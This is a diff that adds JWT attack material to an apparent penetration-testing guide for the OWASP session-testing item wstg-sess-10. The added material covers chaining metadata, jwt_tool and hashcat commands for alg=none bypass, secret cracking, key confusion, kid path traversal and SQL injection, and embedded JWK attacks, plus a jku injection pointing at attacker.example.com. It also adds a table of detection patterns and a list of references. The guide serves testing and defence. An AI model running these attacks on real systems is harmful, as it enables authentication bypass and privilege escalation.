@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [session, cookies, csrf, token, wstg, sess]
 tech_stack: []
 cwe_ids: []
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-sess-01, wstg-sess-02]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-sess-01: "A forgeable JWT (weak secret / alg=none) lets an attacker mint arbitrary session tokens directly, making the entropy/randomness checks in session schema testing irrelevant (Critical)"
+  wstg-sess-02: "A JWT stored without HttpOnly/Secure is worse than typical session cookie theft — the stolen token carries full authorization claims and generally can't be revoked server-side before it expires (High)"
 ---
 
 # wstg-sess-10
@@ -249,6 +251,78 @@ tester.test_sensitive_data()
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# Full automated scan (alg confusion, weak secret, known CVEs) with jwt_tool
+python3 jwt_tool.py "$TOKEN" -M at -t "https://{target}/api/protected" -rh "Authorization: Bearer "
+
+# alg=none bypass — pre-built tampered token (role escalated, no signature)
+python3 jwt_tool.py "$TOKEN" -X a
+# manual equivalent: header {"alg":"none","typ":"JWT"} + payload with "role":"admin" + trailing "."
+
+# Weak HMAC secret brute-force
+hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt
+# or: python3 jwt_tool.py "$TOKEN" -C -d common_secrets.txt
+
+# RS256 -> HS256 key-confusion (sign with server's public key as HMAC secret)
+python3 jwt_tool.py "$TOKEN" -X k -pk public_key.pem
+
+# kid header injection (path traversal / SQLi via key-lookup)
+python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
+# kid pointing to a predictable-content file (empty HMAC key -> forgeable)
+python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
+
+# Null signature attack (CVE-2020-28042) — HS256 header/payload with an empty signature segment
+python3 jwt_tool.py "$TOKEN" -X n
+# manual: "<header_b64>.<payload_b64>." (trailing dot, empty 3rd segment)
+
+# Embedded JWK / key injection attack (CVE-2018-0114) — attacker generates own RSA keypair,
+# embeds the public half in the header's "jwk" claim, signs with the matching private key
+python3 jwt_tool.py "$TOKEN" -X i
+# Burp JWT Editor: New RSA Key -> Repeater tab edit claims -> Attack > Embedded JWK
+
+# jku/JWKS header injection — host attacker-controlled JWKS, point jku at it, sign with matching private key
+python3 jwt_tool.py "$TOKEN" -X s
+python3 jwt_tool.py "$TOKEN" -X s -ju "https://attacker.example.com/jwks.json"
+# check for exposed JWKS endpoints first:
+for p in jwks.json .well-known/jwks.json openid/connect/jwks.json api/keys api/v1/keys; do
+    curl -s -o /dev/null -w "%{http_code} $p\n" "https://{target}/$p"
+done
+
+# Recover RSA public key from two JWTs signed with the same RS256/384/512 key
+docker run -it ttervoort/jws2pubkey "$JWT_1" "$JWT_2"
+
+# Signature-disclosure oracle (CVE-2019-7644) — send a malformed signature and check
+# if the error message leaks the expected value ("Invalid signature. Expected ... got ...")
+python3 jwt_tool.py "$TOKEN" -X n | grep -i "expected"
+
+# Full end-to-end recon -> scan -> exploit -> fuzz workflow against a live endpoint
+python3 jwt_tool.py -t "https://{target}/" -rc "jwt=$TOKEN" -M pb
+python3 jwt_tool.py -t "https://{target}/" -rc "jwt=$TOKEN" -X i -I -pc role -pv admin
+python3 jwt_tool.py -t "https://{target}/" -rc "jwt=$TOKEN" -I -hc kid -hv custom_sqli_vectors.txt
+
+# Hashcat rule-based and pure brute-force cracking (in addition to plain dictionary)
+hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+hashcat -a 3 -m 16500 "$TOKEN" ?u?l?l?l?l?l?l?l -i --increment-min=6
+
+# Known public JWT secrets list (3500+ entries, e.g. your_jwt_secret, change_this_super_secret_random_string)
+python3 jwt_tool.py "$TOKEN" -d jwt.secrets.list -C
+```
+
+| Detection Pattern | Meaning |
+| --- | --- |
+| Request with `alg: none` + no signature returns 200 | [VULN] Algorithm confusion — auth bypass |
+| HS256 token with header/payload intact but empty signature segment (`....`) accepted | [VULN] Null signature attack, CVE-2020-28042 |
+| Token re-signs successfully with a common wordlist secret | [VULN] Weak HMAC secret, Critical |
+| Response accepts a token signed with the server's own RSA public key as HMAC secret | [VULN] alg confusion (RS256→HS256) |
+| Tampered `kid` value reflected/executed server-side | [VULN] kid injection (LFI/SQLi) |
+| Token signed with attacker's own key + embedded `jwk`/`jku` header is accepted | [VULN] Key/JWKS injection, CVE-2018-0114 |
+| Invalid-signature error response echoes the expected signature value | [VULN] Signature disclosure oracle, CVE-2019-7644 |
+| Modified `exp`/`role` claim accepted after re-signing with guessed/leaked secret | [VULN] Privilege escalation via JWT |
+
+---
+
 ## Remediation Guide
 
 ### Secure JWT Implementation
@@ -305,6 +379,16 @@ def verify_token(token):
 | ----------- | ----------------------------------------------------- |
 | **CWE-347** | Improper Verification of Cryptographic Signature      |
 | **CWE-757** | Selection of Less-Secure Algorithm During Negotiation |
+
+---
+
+## References
+
+- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
+- [jwt.io Debugger](https://jwt.io/)
+- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
+- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
+- [PayloadsAllTheThings - JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
 
 
 ---
